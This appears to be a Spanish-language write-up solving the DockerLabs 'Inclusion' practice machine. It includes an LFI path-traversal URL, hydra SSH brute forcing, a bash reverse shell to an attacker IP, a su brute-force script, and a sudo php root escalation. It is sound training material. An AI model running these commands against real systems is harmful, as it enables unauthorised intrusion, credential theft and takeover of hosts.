# Máquina Inclusion

---------------------

Dificultad -> Medium

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

-----------------
## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada al puerto 22 y 80:

```shell
nmap -sCV -p8080 172.17.0.2 -oN targeted
________________________________________________
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 03cf7254de54aecd2a16586b8af552dc (ECDSA)
|_  256 13bbc212f59730a149c7f9d0bad05ef7 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos algo más de info sobre el puerto 80 y 22. Vamos a echarle un vistazo a la web que corre por el puerto 80.

![Pasted image 20240414234421](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/ee73b905-00c4-41ff-ba59-5f00da5969b2)

Es la web por defecto de apache, así que aplicamos **Fuzzing** con **gobuster**.

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
-------------------------------------------------------------------------
/icons/               (Status: 403) [Size: 275]
/shop/                (Status: 200) [Size: 1112]
/server-status/       (Status: 403) [Size: 275] 
```

Encontramos un directorio **/shop**, accedemos, y nos encontramos con una pista.

![Pasted image 20240415001358](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/24b5bc57-55da-4e87-a4cd-21e6cc1859ba)

_**"Error de Sistema: ($_GET['archivo']"); **_

Esto nos dice que se está usando un parámetro llamado **archivo** en la url para pasarle un valor e incluir un archivo en la web. Esto puede ser vulnerable ante un **LFI** (Local File Inclusion)

Tras varias pruebas, conseguimos leer archivos de la máquina mediante un **Path traversal**

```
http://172.17.0.2/shop/?archivo=../../../../../../etc/passwd
```

![Pasted image 20240415001300](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/a7d86c4b-6b6b-4ebc-902b-4650a6d9a1ad)

Teniendo un **LFI** podemos tratar de derivarlo a un **RCE** (Remote Code Execution) mediante un **Log Poisoning** o envenenamiento de los logs del sistema. Consistirá en inyectar código malicioso mediante peticiones al sistema, que posteriormente llegue a ser interpretado por medio del **LFI**.

![Pasted image 20240415002355](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/5a7ccb2b-005d-4361-a578-9e693ce78de5)

Tenemos dos usuarios, **manchi** y **seller**. En este punto he intentado listar logs de apache, de ssh, claves privadas de estos dos usuarios para ssh, pero nada ha dado resultado. Por lo tanto, he hecho fuerza bruta al protocolo **ssh** con **hydra** para los dos usuarios. Y el usuario **manchi**, tenía una contraseña fácil, por lo tanto hemos conseguido adivinarla con **hydra**.

```shell
hydra -l manchi -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
----------------------------------------------------------
[22][ssh] host: 172.17.0.2   login: manchi   password: lovely
```

Credenciales -> **manchi:lovely**
Accedemos por **ssh**.

```
ssh manchi@172.17.0.2
```

---------------------------
### Tratamiento de la tty

Si tenemos problemas al aplicar el tratamiento de la **tty**, lo que podemos hacer es ponernos en escucha desde una consola nueva por un puerto. Por ejemplo con **netcat**

```shell
nc -nlvp 443
```

Y nos enviamos desde la máquina víctima una reverse shell para acceder:

```shell
bash -c "bash -i >&/dev/tcp/192.168.1.39/443 0>&1" 
```

(Siendo la 192.168.1.39 mi IP de la máquina atacante)

---------------

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:

```shell
script /dev/null -c bash 
```
(hacemos  **ctrl  +  Z**)

```shell
stty raw -echo; fg
reset xterm
stty rows 62 columns 248
export TERM=xterm
export SHELL=bash
```

Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina.
Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.

------------

## Escalada de privilegios

Revisamos directorio home de manchi, capabilities, archivos SUID, etc. Y no hemos encontrado nada, por lo que vamos a transferirnos un script para hacer fuerza bruta hacia el usuario **seller** desde la propia máquina. Nos transferiremos también el diccionario **rockyou**.

Nos descargamos el script.sh del siguiente repositorio en la **máquina atacante**-> [Script de fuerza bruta](https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.sh)

```shell
wget https://raw.githubusercontent.com/Maalfer/Sudo_BruteForce/main/Linux-Su-Force.sh
```

Probamos a transferirlo con **wget** o **curl** pero no es posible porque no están instalados.
Los transferiremos utilizando **SCP** (Secure Copy) a la máquina con la dirección IP 172.17.0.2 a través de SSH.

Desde la máquina atacante indicamos la ruta del archivo a tranferir y la ruta de la máquina víctima donde se alojará:

```shell
scp rockyou.txt manchi@172.17.0.2:/home/manchi/rockyou.txt
scp Linux-Su-Force.sh manchi@172.17.0.2:/home/manchi/rockyou.txt
```

Le daremos permisos de ejecución y lo ejecutaremos hacia el usuario **seller*:

```shell
./Linux-Su-Force.sh seller rockyou.txt 
-----------------------------------------
Contraseña encontrada para el usuario seller: qwerty
```

Hemos encontrado la contraseña! -> **qwerty**
Migramos al usuario **seller**:

```shell
su seller
```

Usaremos "**sudo -l**" para ver si el usuario **seller** puede ejecutar algún binario con permisos privilegiados.

```shell
sudo -l
--------------------------------------
 (ALL) NOPASSWD: /usr/bin/php
```

Puede ejecutar **php**.
Podemos abusar de este con los siguiente comandos:

```shell
CMD="/bin/sh"
sudo php -r "system('$CMD');"
```

Si no sabemos como abusar de algún binario o lo desconocemos, siempre podemos consultar [GTFOBins](https://gtfobins.github.io/)

```shell
whoami
-----------------
root
```

Hemos conseguido el nivel de privilegios máximo!
